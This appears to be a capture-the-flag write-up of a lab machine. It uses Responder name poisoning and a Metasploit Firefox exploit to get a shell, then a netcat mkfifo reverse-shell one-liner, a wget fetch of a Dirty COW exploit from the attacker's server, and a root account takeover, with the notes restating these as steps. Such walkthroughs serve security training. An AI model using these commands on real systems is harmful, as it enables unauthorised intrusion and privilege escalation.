# Enumeration

## Responder

Before start scanning start a responder listner

root@kali:~/Responder# ./Responder.py -I eth0


[*] [NBT-NS] Poisoned answer sent to 192.168.1.8 for name DISNEYWORLD (service: Workstation/Redirector)

Leopold is looking for DISNEYWORLD!!

if you're using Responder on a network with other machines, this could get noisy, if not messy, so if you edit the Responder.conf file, you can isolate the responses to the victim:

>> nano Responder.conf 



; Specific IP Addresses to respond to (default = All)

; Example: RespondTo = 10.20.1.100-150, 10.20.3.10

RespondTo =192.168.1.8

# TCP port scan

![image](https://user-images.githubusercontent.com/24206178/154684823-7a83aa10-190f-4f52-b46a-877c1efe599d.png)


139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

445/tcp open  netbios-ssn Samba smbd 3.6.6 (workgroup: WORKGROUP)

smb-os-discovery: 

|   OS: Unix (Samba 3.6.6)


#Only SMB

Samba 3.6.6

# vulnerability assessment

![image](https://user-images.githubusercontent.com/24206178/154684965-216a2a1a-c601-4ed5-b40a-1dbc58cd6ab7.png)

![image](https://user-images.githubusercontent.com/24206178/154684977-6044aa2c-3138-4823-bfbb-a464d0eb4717.png)

![image](https://user-images.githubusercontent.com/24206178/154684992-e8044142-149b-4787-ac6b-16c9c2e3a37f.png)

# Explotation

msf5 > search firefox

msf5 > use exploits/multi/browser/firefox_tostring_console_injection.rb


this exploit open reverse TCP handler

msf5 exploit(multi/browser/firefox_tostring_console_injection) > run

[*] Started reverse TCP handler on 192.168.1.9:4444 
[*] Using URL: http://0.0.0.0:8080/DhJRtwm8IvXO
[*] Local IP: http://192.168.1.9:8080/DhJRtwm8IvXO
[*] Server started.


Now we will use the local Ip URL to open the session
all we need is for the victim to get that file


We will use responder to do that
------------------------------------------------------------------------------

Responder
-----------------

#Setting up our redirect:

root@kali:~/Responder/files# nano zyad.hml

#And then editing the Responder.conf file:

[HTTP Server]

; Set to On to always serve the custom EXE

Serve-Always = Off

; Set to On to replace any requested .exe with the custom EXE

Serve-Exe = Off

; Set to On to serve the custom HTML if the URL does not contain .exe

; Set to Off to inject the 'HTMLToInject' in web pages instead

Serve-Html = on

; Custom HTML to serve

HtmlFilename = files/zyad.html

#Then firing up Responder:

Which is now only listening for requests from our victim. 

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.1.9]
    Challenge set              [1122334455667788]
    Respond To                 ['192.168.1.8']

We wait for the request:

[+] Listening for events...
[*] [NBT-NS] Poisoned answer sent to 192.168.1.8 for name DISNEYWORLD (service: Workstation/Redirector)

[HTTP] Sending file files/zyad.html to 192.168.1.8


msf5 exploit(multi/browser/firefox_tostring_console_injection) >
[*] 192.168.1.8      firefox_tostring_console_injection - Gathering target information for 192.168.1.8

[*] 192.168.1.8      firefox_tostring_console_injection - Sending HTML response to 192.168.1.8

[*] Command shell session 1 opened (192.168.1.9:4444 -> 192.168.1.8:42583) at 2019-12-15 19:30:25 +0100

the session is opened!

> sessions -i 1

>id
  uid=1000(leopold) gid=1000(leopold) groups=1000(leopold),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),107(lpadmin),124(sambashare)

>pwd
/home/leopold


>ls -l
total 52
-rw-rw-r-- 1 leopold  leopold   44 Sep 21 18:41 browse.sh

drwxr-xr-x 2 leopold  leopold 4096 Sep 20 21:56 Desktop

drwxr-xr-x 2 leopold  leopold 4096 Sep 20 21:56 Documents

drwxr-xr-x 2 leopold  leopold 4096 Sep 20 21:56 Downloads

-rw-r--r-- 1 leopold  leopold 8445 Sep 20 21:46 examples.desktop

-rw-r--r-- 1 firefart root      23 Sep 21 19:20 flag.txt

drwxr-xr-x 2 leopold  leopold 4096 Sep 20 21:56 Music

drwxr-xr-x 2 leopold  leopold 4096 Sep 20 21:56 Pictures

drwxr-xr-x 2 leopold  leopold 4096 Sep 20 21:56 Public

drwxr-xr-x 2 leopold  leopold 4096 Sep 20 21:56 Templates

drwxr-xr-x 2 leopold  leopold 4096 Sep 20 21:56 Videos

now we are in but we need more powrfill session
so we can use netcat to achive that

## pentestmonkey reverse shell

![image](https://user-images.githubusercontent.com/24206178/154685190-fe9b98b9-b957-4c68-8872-e306d2b8d4fc.png)

![image](https://user-images.githubusercontent.com/24206178/154685201-8c8e7640-47ae-469f-b775-de519a46f3b8.png)

## start Netcat


>nc -lvnp 1234
listening on [any] 1234 ...

now try to write this in our sesstion

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.9 1234 >/tmp/f

>nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.1.9] from (UNKNOWN) [192.168.1.8] 39412
/bin/sh: 0: can't access tty; job control turned off


$ python -c "import pty;pty.spawn('/bin/bash')"
leopold@leopold:~$ 


eopold@leopold:~$ uname -a 

Linux leopold 3.5.0-17-generic #28-Ubuntu SMP Tue Oct 9 19:32:08 UTC 2012 i686 i686 i686 GNU/Linux

![image](https://user-images.githubusercontent.com/24206178/154685244-84b03811-9272-4566-949a-534cc17e28f7.png)

![image](https://user-images.githubusercontent.com/24206178/154685251-68a48c24-3fc9-4d7b-9f7d-0ec0a4b605c9.png)

make it available in the http server

>python -m SimpleHTTPServer 80

leopold@leopold:~$ cd /tmp	

leopold@leopold:/tmp$ wget http://192.168.1.9:80/40839.c

wget http://192.168.1.9:80/40839.c
--2019-12-15 06:42:06--  http://192.168.1.9/40839.c
Connecting to 192.168.1.9:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5006 (4.9K) [text/plain]
Saving to: `40839.c.1'

100%[======================================>] 5,006       --.-K/s   in 0s      

2019-12-15 06:42:06 (207 MB/s) - `40839.c.1' saved [5006/5006]

![image](https://user-images.githubusercontent.com/24206178/154685285-ceb5f2fd-9060-4d48-a9b9-a5beaf24ee22.png)

gcc -pthread 40839.c -o dirty -lcrypt

leopold@leopold:/tmp$ ./dirty
./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 12345

![image](https://user-images.githubusercontent.com/24206178/154685305-6a4a3e23-8be6-47a3-8443-1f37fd7710c7.png)


leopold@leopold:/tmp$ su firefart
su firefart
Password: 12345

firefart@leopold:/tmp# 

firefart@leopold:/tmp# cd /root               
cd /root

firefart@leopold:~# cat flag.txt

# Notes

What I have learned from this machine is

1- Open Responder first thing before doing any scanning maybe you will get something

2- There is an exploit called exploits/multi/browser/firefox_tostring_console_injection.rb that can give you a shell session by using responder to make the victim excute the file that have the local ip URL
3- pentestmonkey reverse shell is apowerfull shell that you can have by netcat and running 
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.9 1234 >/tmp/f in the victim machine
4- to get more stable shell use this command
    python -c "import pty;pty.spawn('/bin/bash')"
5- uname -a is displaying the OS name and that may be a good information to know

6- 3.5.0-17-generic  is vulnarable to a very powerfull vaulnarability called Dirty cow

7- when you know that he machine is vulnarable to a specific vulanarability that are inexploit-db you
    downlaod it
    make it available in html server    python -m SimpleHTTPServer 80
    download it in the victim machin by using wget   wget http://192.168.1.9:80/40839.c
    follow the instruction in how to excute the vulnarability after you have it in the victim machine

8- Dirty cow This exploit uses the pokemon exploit of the dirtycow vulnerability

// as a base and automatically generates a new passwd line.

// The user will be prompted for the new password when the binary is run.

// The original /etc/passwd file is then backed up to /tmp/passwd.bak

// and overwrites the root account with the generated line.

// After running the exploit you should be able to login with the newly

// created user.
